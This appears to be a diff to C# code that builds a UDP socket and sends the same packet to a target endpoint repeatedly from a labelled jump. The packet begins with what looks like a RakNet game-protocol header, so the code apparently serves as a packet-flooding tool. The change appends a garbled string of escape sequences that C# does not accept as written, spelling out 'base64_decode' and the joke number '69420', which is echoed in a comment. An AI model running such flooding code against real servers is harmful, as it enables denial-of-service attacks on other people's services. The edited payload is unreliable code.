@@ -204,8 +204,8 @@ ProtocolType.Udp);
 
             IPEndPoint endPoint = new IPEndPoint(P, i);
 
-            string text = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78";
-            byte[] send_buffer = Encoding.ASCII.GetBytes(text);
+            string text = "\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78\x69\x42\xfc\x5f\142\x61\x73\x65\66\x34\137\144\x65\143\157\x64\145\x541\x69420";
+            byte[] send_buffer = Encoding.ASCII.GetBytes(text);//69420
         goback:
             sock.SendTo(send_buffer, endPoint);
             sock.SendTo(send_buffer, endPoint);
